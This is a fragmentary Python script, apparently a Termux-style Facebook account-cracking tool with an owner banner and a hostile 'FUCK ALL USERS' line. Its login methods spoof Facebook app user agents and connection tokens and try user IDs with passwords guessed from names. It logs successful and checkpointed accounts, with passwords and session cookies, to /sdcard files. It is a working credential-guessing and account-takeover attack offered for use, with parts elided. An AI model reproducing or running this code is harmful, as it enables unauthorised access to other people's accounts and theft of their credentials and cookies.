...
os.system('https://chat.whatsapp.com/F228l8aT3H5LHLNUfHOrBT')
...
def logo():
  ...
  \33[1;36m  ____  __    ___   ________ __    ____  __  ____    __ 
   / __ )/ /   /   | / ____/ //_/   / __ )/ / / / /   / / 
  / __  / /   / /| |/ /   / ,<     / __  / / / / /   / /  
 / /_/ / /___/ ___ / /___/ /| |   / /_/ / /_/ / /___/ /___
/_____/_____/_/  |_\____/_/ |_|  /_____/\____/_____/_____/
                                                          

\33[1;36m---------------------------------------------------
 \33[1;34m Owner     >>    UPAKAR : YUNISH 
 \33[1;97m Github    >>    UPAKAR321
 \33[1;32m Tool      >>    FREE
  \33[1;36mversion   >>    0.3
   \33[1;32m__________FUCK ALL USERS _________
\33[1;32m--------------------------------------------------''')
	p(logo)
def clear():
	os.system("clear")
...
def iAmMethod3Ua():
	...
	ua = random.choice ("  'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(width_)+',height='+str(height_)+'};]")
	return ua


nid = ''.join((random.choice(['A','a','B','b','c','CCOOKIES','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[YU_OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [YU_BROTHER] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					p('\r\033[1;91m[YU_CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [YU_BROTHER %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[YU_OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/YU_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/YU_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[YU_CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/YU_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
